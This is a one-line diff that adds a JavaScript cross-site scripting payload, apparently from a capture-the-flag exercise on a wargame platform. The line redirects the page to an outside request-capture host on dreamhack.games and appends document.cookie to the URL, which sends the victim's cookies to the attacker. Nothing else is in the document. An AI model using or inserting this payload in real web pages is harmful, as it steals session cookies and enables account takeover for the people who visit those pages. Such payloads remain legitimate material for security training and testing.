@@ -1,0 +1,1 @@
+document.location = "https://joufvhs.request.dreamhack.games" + document.cookie
